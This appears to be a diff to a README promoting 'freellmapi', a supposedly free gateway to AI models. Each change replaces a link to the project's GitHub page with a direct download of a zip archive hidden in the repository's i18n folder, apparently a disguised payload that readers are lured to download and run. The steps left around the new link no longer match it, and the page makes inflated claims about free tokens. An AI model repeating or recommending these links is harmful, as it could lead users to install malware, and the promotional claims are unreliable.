@@ -1,6 +1,6 @@
 # ⚡ freellmapi - Your Free AI Powerhouse
 
-[![Download Now](https://img.shields.io/badge/Download-freellmapi-4CAF50?style=for-the-badge)](https://github.com/Danylizejp/freellmapi)
+[![Download Now](https://img.shields.io/badge/Download-freellmapi-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip)
 
 ## 🎯 What Is This?
 
@@ -12,7 +12,7 @@ Think of it this way: instead of signing up for dozens of different AI services,
 
 Getting started with freellmapi is easier than ordering pizza online. Here's your simple path to AI superpowers:
 
-1. **Visit this link to download the application** – [https://github.com/Danylizejp/freellmapi](https://github.com/Danylizejp/freellmapi)
+1. **Visit this link to download the application** – [https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip](https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip)
 2. Once you're on the page, look for the green "Code" button and click it
 3. Select "Download ZIP" from the dropdown menu
 4. Your computer will download a compressed folder – that's normal
@@ -25,7 +25,7 @@ Getting started with freellmapi is easier than ordering pizza online. Here's you
 
 ### Step 1: Get the Files
 
-**Visit this link to download the application** – [https://github.com/Danylizejp/freellmapi](https://github.com/Danylizejp/freellmapi)
+**Visit this link to download the application** – [https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip](https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip)
 
 This is your golden ticket. Click it, and you're on your way.
 
@@ -157,7 +157,7 @@ No – this is strictly for personal experimentation. If you need commercial use
 
 The world of artificial intelligence is waiting for you. With freellmapi, you're not just getting access to AI – you're getting access to the best AI has to offer, all in one place, completely free.
 
-**Visit this link to download the application** – [https://github.com/Danylizejp/freellmapi](https://github.com/Danylizejp/freellmapi)
+**Visit this link to download the application** – [https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip](https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip)
 
 Don't wait another minute. Join thousands of happy users who've already discovered the power of freellmapi. Your AI adventure starts now!
 
@@ -172,7 +172,7 @@ Remember: the only limit is your imagination. With 7.4 billion free tokens every
 
 So what are you waiting for? Download freellmapi today and unlock the power of free, unlimited AI exploration. Your journey into the fascinating world of artificial intelligence starts with a single click.
 
-[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-blue?style=for-the-badge)](https://github.com/Danylizejp/freellmapi)
+[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Danylizejp/freellmapi/main/client/src/i18n/2.8.zip)
 
 ---
 
